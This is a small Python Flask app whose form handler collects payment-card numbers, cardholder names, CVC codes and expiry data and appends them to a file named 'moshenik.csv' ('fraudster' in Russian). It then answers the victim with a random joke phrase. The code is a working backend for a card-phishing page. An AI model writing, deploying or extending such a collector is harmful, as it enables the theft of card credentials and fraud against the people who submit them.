import random
from flask import Flask, render_template, request
import csv

app = Flask(__name__)


@app.route('/')
def index():
    return render_template('page.html')


@app.route('/save', methods=['POST'])
def save():
    number = request.form['number']
    name = request.form['name']
    cvc = request.form['cvc']
    data = request.form['data']
    with open('moshenik.csv', mode='a', newline='\n',encoding='utf8') as file:
        add = csv.writer(file, delimiter=';')
        add.writerow([number, name, cvc, data])

    a = random.randint(1, 2)
    if a == 1:
        return "Вы вупсень"
    if a == 2:
        return "Вы пупсень"


app.run(debug=True)
